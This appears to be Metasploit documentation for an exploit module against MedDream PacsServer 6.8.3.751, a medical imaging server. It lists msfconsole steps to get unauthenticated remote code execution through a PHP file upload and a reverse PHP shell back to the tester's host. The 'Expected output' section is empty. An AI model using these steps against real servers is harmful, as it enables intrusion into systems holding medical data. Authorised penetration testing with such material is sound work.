## Vulnerable Application
This module exploits a vulnerability found in MedDream PacsServer, which
allows unauthenticated attackers to perform Remote Code Execution via an
aribitrary PHP file upload.  Depending on how the web server is configured to
run will determine what level of access priviliged is obtained.

The following version is known to vulnerable:

* 6.8.3.751

## Verification Steps
List the steps needed to make sure this thing works

1. Start `msfconsole`
2. Do: `use exploit/windows/http/meddream_pacs_rce`
3. Do: `set rhosts <ip address of meddream pacs server>`
4. Do: `check`
5. Verify that application is vulnerable via version check
6. Do: `set lhost <ip address of metasploit system>`
7. Do: `exploit`
8. Verify that shell is returned via system commands: `whoami` or `ipconfig`

## Options
Path for web application is customizable upon installation.  Installation
guide defaults to `/Pacs`

Default Payload `php/reverse_php` is used for reliability

## Scenarios

### MedDream PacsServer 6.8.3.751 on Windows 2016

Expected output:
